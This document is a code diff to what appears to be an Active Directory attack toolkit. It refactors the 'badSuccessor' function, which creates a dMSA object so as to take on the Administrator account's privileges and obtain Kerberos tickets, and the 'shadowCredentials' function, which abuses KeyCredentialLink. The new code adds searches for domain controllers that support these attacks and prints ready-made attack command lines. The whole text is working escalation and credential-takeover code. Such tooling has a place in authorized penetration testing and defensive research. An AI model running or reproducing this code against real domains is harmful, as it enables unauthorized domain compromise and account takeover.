@@ -1,4 +1,4 @@
-import binascii, datetime, random, string, base64, collections, asyncio
+import binascii, datetime, random, string, base64, asyncio
 from typing import Literal
 from urllib import parse
 from bloodyAD import utils
@@ -21,34 +21,34 @@ from kerbad.protocol.encryption import Enctype
 from winacl.dtyp.security_descriptor import SECURITY_DESCRIPTOR
 
 
-# TODO make it multi forest
 def badSuccessor(conn, dmsa: str, t: list = ["CN=Administrator,CN=Users,DC=Current,DC=Domain"], ou: str = None):
     """
     Add a new DMSA (Dedicated Managed Service Account) object
 
     :param dmsa: hostname of the DMSA object (no need to add '$')
-    :param t: Distinguished Name of the target whose privileges are to be assumed (can be called multiple times, e.g. "-t CN=Admin,CN=Users,DC=domain,DC=com -t CN=User,CN=Users,DC=domain,DC=com")
+    :param t: Distinguished Name of the target whose privileges are to be assumed (can be called multiple times, e.g. "-t CN=Admin,CN=Users,DC=domain,DC=com -t CN=John,CN=Users,DC=domain,DC=com")
     :param ou: Organizational Unit for the DMSA object. If not provided, chooses the first OU the logged user can add child to.
     """
-    # Check if the schema version is 2025
-    schema_version = next(
-        conn.ldap.bloodysearch(
-            conn.ldap.schemaNC, attr=["objectVersion"]
-        )
-    ).get("objectVersion", None)
 
-    if int(schema_version[0]) < 91:
-        raise BloodyError("Schema version is not 2025. DMSA creation is not supported.")
+    def getWeakOU(conn):
+        # Check if one of the DCs is Windows Server 2025 or higher (needed for Kerberos DMSA)
+        compatible_dcs = utils.findCompatibleDC(conn, min_version=10, scope="DOMAIN")
+        if not compatible_dcs:
+            raise BloodyError("DC2025 not found, DMSA not supported.")
+        
+        # Check if the schema version is 2025
+        # schema_version = next(
+        #     conn.ldap.bloodysearch(
+        #         conn.ldap.schemaNC, attr=["objectVersion"], raw=True
+        #     )
+        # ).get("objectVersion", None)
+        # if int(schema_version[0]) < 91:
+        #     raise BloodyError("Schema version is not 2025. DMSA creation is not supported.")
 
-    if len(t) == 1:
-        t = ["CN=Administrator,CN=Users," + conn.ldap.domainNC]
-    else:
-        t = t[1:]
-
-    # First we try to find a OU where we can add a child object
-    # If we don't find one, we will use the first one where we have DACL write on
-    # If we don't find one, we will use the first one where we have ownership write on
-    if not ou:
+        # First we try to find a OU where we can add a child object
+        # If we don't find one, we will use the first one where we have DACL write on
+        # If we don't find one, we will use the first one where we have ownership write on
+        ou = None
         writable_ou = []
         writable_nt_ou = []
         writable_owner_ou = []
@@ -82,9 +82,18 @@ def badSuccessor(conn, dmsa: str, t: list = ["CN=Administrator,CN=Users,DC=Curre
             elif writable_owner_ou:
                 ou = writable_owner_ou[0]
                 bloodySet.owner(conn, ou, conn.conf.username)
-                genericAll(conn, ou, conn.conf.username)
+                genericAll(conn, ou, conn.conf.username)                        
             else:
                 raise BloodyError("No suitable OU found for adding the DMSA object")
+        return ou, compatible_dcs
+
+    if not ou:
+        ou,compatible_dcs = getWeakOU(conn)
+        
+    if len(t) == 1:
+        t = ["CN=Administrator,CN=Users," + conn.ldap.domainNC]
+    else:
+        t = t[1:]
 
     dmsa_dn = f"CN={dmsa},{ou}"
 
@@ -119,9 +128,31 @@ def badSuccessor(conn, dmsa: str, t: list = ["CN=Administrator,CN=Users,DC=Curre
     splitted_url = conn.ldap.co_url.split("-",1)
     if "sspi" in splitted_url[0]:
         LOG.error("[-] SSPI is not supported yet to retrieve dMSA TGT, use Rubeus or kerbad certstore, e.g.:")
-        LOG.error(f"badS4U2self 'kerberos+certstore://{conn.conf.domain}\\{conn.conf.username}@192.168.100.5' 'krbtgt/{conn.ldap.dc_domain}@{conn.ldap.dc_domain}' '{dmsa_sama}@{conn.ldap.dc_domain}' --dmsa")
+        LOG.error(f"badS4U2self 'kerberos+certstore://{conn.conf.domain}\\{conn.conf.username}' 'krbtgt/{conn.ldap.dc_domain}@{conn.ldap.dc_domain}' '{dmsa_sama}@{conn.ldap.dc_domain}' --dmsa")
         return
+    
     url = "kerberos+" + splitted_url[1]
+
+    parsed = parse.urlparse(url)
+    query_params = parse.parse_qs(parsed.query)
+    for param in ['serverip', 'dc', 'dcc', 'realmc']:
+        query_params.pop(param, None)
+
+    host_params = {"ip": conn.conf.dcip}
+    if conn.ldap._serverinfo["dnsHostName"] not in compatible_dcs:
+        LOG.warning("[!] The current DC does not support Kerberos for dMSA")
+        LOG.info(f"[*] Current DC does not support dMSA Kerberos, attempting alternative 2025 DCs: {compatible_dcs}")
+        host_params = utils.connectReachable(conn, compatible_dcs, ports=[88])
+        if not host_params:
+            LOG.error("[-] DC2025 not found, try to reach one of the list above manually:")
+            new_netloc = parsed.netloc.split("@")[0] + '@<DC2025_IP>' if '@' in parsed.netloc else parsed.netloc
+            url = parse.urlunparse(parsed._replace(netloc=new_netloc, query=query_params))
+            LOG.error(f"[-] badS4U2self '{url}' 'krbtgt/{conn.ldap.dc_domain}@{conn.ldap.dc_domain}' '{dmsa_sama}@{conn.ldap.dc_domain}' --dmsa")
+            return
+
+    new_netloc = parsed.netloc.split("@")[0] + '@' + host_params["ip"] if '@' in parsed.netloc else parsed.netloc
+    url = parse.urlunparse(parsed._replace(netloc=new_netloc, query=query_params))
+
     LOG.debug(f"[*] Using kerbad url: {url}")
     try:
         cu = factory.KerberosClientFactory.from_url(url)
@@ -131,6 +162,8 @@ def badSuccessor(conn, dmsa: str, t: list = ["CN=Administrator,CN=Users,DC=Curre
         tgs, encTGSRepPart, key = client.with_clock_skew(client.S4U2self, target_user, service_spn, is_dmsa=True)
     except Exception as e:
         LOG.error(f"[-] Failed to retrieve dMSA TGT")
+        if host_params["ip"] != conn.conf.dcip:
+            LOG.error(f"[-] {host_params['ip']} may not be synchronized to {conn.conf.dcip}, wait or try to add dMSA directly on {host_params['ip']}")
         LOG.error("[-] Try using Rubeus, or something like:")
         LOG.error(f"badS4U2self '{url}' 'krbtgt/{conn.ldap.dc_domain}@{conn.ldap.dc_domain}' '{dmsa_sama}@{conn.ldap.dc_domain}' --dmsa")
         raise e
@@ -437,51 +470,21 @@ def shadowCredentials(conn, target: str, path: str = "CurrentPath"):
     :param path: filepath for the generated credentials (TGT ccache or pfx if PKINIT fails)
     """
 
-    dc_dict = collections.defaultdict(dict) 
-    # Check if KeyCredential is supported on current DC or find alternative DC
-    for dc_info in conn.ldap.bloodysearch("CN=Sites,"+conn.ldap.configNC, "(|(objectClass=nTDSDSA)(objectClass=server))", search_scope=Scope.SUBTREE ,attr=["msDS-Behavior-Version","msDS-HasDomainNCs","objectClass", "dNSHostName"], raw=True):
-        if b"nTDSDSA" in dc_info["objectClass"]:
-            parent_name = dc_info["distinguishedName"].split(",", 1)[1]
-            dc_dict[parent_name]["version"] = int(dc_info["msDS-Behavior-Version"][0])
-            dc_dict[parent_name]["domainNCs"] = dc_info["msDS-HasDomainNCs"]
-        elif b"server" in dc_info["objectClass"]:
-            dc_dict[dc_info["distinguishedName"]]["hostname"] = dc_info["dNSHostName"][0].decode()
-    has_KeyCredential = True
-    alt_servers = []
-    for dn,dc_info in dc_dict.items():
-        if dn == conn.ldap._serverinfo["serverName"]:
-            if dc_info["version"] < 7:
-                has_KeyCredential = False
-            else:
-                break
-        elif dc_info["version"] > 6 and conn.ldap.domainNC.encode() in dc_info.get("domainNCs"):
-            alt_servers.append(dc_info["hostname"])
+    # We scope on the domain of the target
+    compatible_dcs = utils.findCompatibleDC(conn, min_version=7, scope="DOMAIN")
 
-    # If server in forest but not domain with keycredential support, can it be used?
-    if not has_KeyCredential:
+    if conn.ldap._serverinfo["dnsHostName"] not in compatible_dcs:
+        if not compatible_dcs:
+            LOG.error("[-] No DC with Windows Server 2016 or higher found on this domain, operation aborted")
+            return
         LOG.warning(
             "[!] This DC does not seem to support KeyCredentialLink"
         )
-        if not alt_servers:
-            LOG.error("[!] No DC with Windows Server 2016 or higher found on this domain, operation aborted")
-            return
 
-        LOG.info(f"[*] Attempting alternative DCs with KeyCredentialLink support: {alt_servers}")
-        record_list = []
-        for srv_name in alt_servers:
-            record_list.append({"type": ["A"], "name": srv_name})
-        host_params = asyncio.get_event_loop().run_until_complete(ldap.findReachableServer(record_list,conn.conf.dns,conn.conf.dcip, [389,636]))
-        if not host_params:
-            LOG.warning(
-                f"[!] No reachable alternative DC found, try to provide one manually in --host or a dns server with --dns"
-            )
+        LOG.info(f"[*] Attempting alternative DCs with KeyCredentialLink support: {compatible_dcs}")
+        new_conn = utils.connectReachable(conn, compatible_dcs, ports=[389,636])
+        if not new_conn:
             return
-        schemes = {389: "ldap", 636: "ldaps", 3268: "gc", 3269: "gc-ssl"}
-        conn = conn.copy(
-                scheme=schemes[host_params["port"]],
-                host=host_params["name"],
-                dcip=host_params["ip"],
-            )
 
     target_dn = None
     target_sAMAccountName = None
